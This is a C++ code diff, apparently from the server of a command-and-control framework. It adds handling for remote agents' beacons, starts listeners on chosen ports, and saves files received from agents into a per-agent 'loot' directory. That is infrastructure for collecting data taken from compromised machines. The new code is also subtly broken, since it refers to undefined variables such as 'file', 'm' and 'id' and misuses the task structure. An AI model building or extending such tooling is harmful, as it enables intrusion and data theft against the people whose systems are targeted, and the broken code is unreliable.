@@ -151,7 +151,7 @@ int Server::DispatchTasking(){
 
 
 // creates a new thread using module of id `id`
-int Server::GenerateInstance(Module* mod){
+int Server::GenerateInstance(Module* mod, int port){
     //bool found = false;
     // check if the ID exists in the list of modules
     /*for(Module *mod : *modules){
@@ -170,7 +170,16 @@ int Server::GenerateInstance(Module* mod){
     int nid = rand();
     NetInst *inst = new NetInst(this, nid, NULL);
     TransportAPI* transport = mod->NewTransport(inst);
+    if(port != 0){
+        if(!api_check(transport->set_port(port))) {
+            log(LOG_ERROR, "Failed to create NetInstance\n");
+            return 1;
+        }
+    }
+    
     inst->SetTransport(transport);
+    
+    // push to the back and start the thread
     instances->push_back(inst);
     std::thread *obj = inst->StartThread();
     thread_objs->push_back(obj);
@@ -488,6 +497,28 @@ int Server::HandleTask(ptask_t task){
     // create new backend instance
     case TASK_NEW_NETINST:
         log(LOG_INFO, "Caught request for new backend (UNIMPLEMENTED)");
+        {
+            int inst_id = (int) *(task->data);
+            int portno = (int) *(task->data[4]);
+            bool found = false;
+            for(Module* m : modules) {
+                if(m->GetID() == inst_id){
+                    found = true;
+                    if(GenerateInstance(m, portno)) {
+                        found = false;
+                        break;
+                    }
+                }
+            }
+            if(!found) {
+                log(LOG_ERROR, "Unable to start module of ID %d found\n", inst_id);
+                ptask_t remote_task = CreateTasking(task->from, RESP_FAIL, 0, nullptr);
+                PushTask(remote_task);
+            } else {
+                ptask_t remote_task = CreateTasking(task->from, RESP_OK, 0, nullptr);
+                PushTask(remote_task);
+            }
+        }
         break;
     
     // write beacon data for agent
@@ -497,6 +528,40 @@ int Server::HandleTask(ptask_t task){
             printf("Caught beacon..\n");
             int success = Common::write_agent_beacon(task->data);
             printf("Success status: %d\n", success);
+        }
+        break;
+
+    case TASK_SAVE_FILE:
+        {
+            log(LOG_INFO, "Saving file from agent");
+            char* fname = Common::digest(file->path);
+            char path[2048];
+            char cwd[BUFSIZ];
+
+            memset(path, 0, sizeof(path));
+            memset(cwd, 0, sizeof(cwd));
+            bool found = false;
+
+            for(NetInst* n : instances) {
+                if(n == task->from()) {
+                    found = true;
+                    char* agent_id = m->GetAgentName();
+                    if(agent_id == nullptr) {
+                        ptask_t remote_task = CreateTasking(task->from, RESP_FAIL, 0, nullptr);
+                        PushTask(remote_task);
+                        found = false;
+                        break;
+                    }
+                }
+            }
+
+            if(found) {
+                sprintf(path, "%s/agents/%s/loot/%s.bin", getcwd(cwd, sizeof(cwd)), id, fname);
+                int success = Common::write_networked_file(task->data, path);
+                ptask_t remote_task = CreateTasking(task->from, success, 0, nullptr);
+                PushTask(remote_task);
+            }
+
         }
         break;
 
@@ -626,7 +691,7 @@ int Server::MainLoop(){
 
     printf("Address of module: %p\n", modules);
     
-    GenerateInstance(modules->back());
+    GenerateInstance(modules->back(), 0);
 
     ptask_t tmp = (ptask_t)malloc(sizeof(task_t));
     tmp->to = 0;
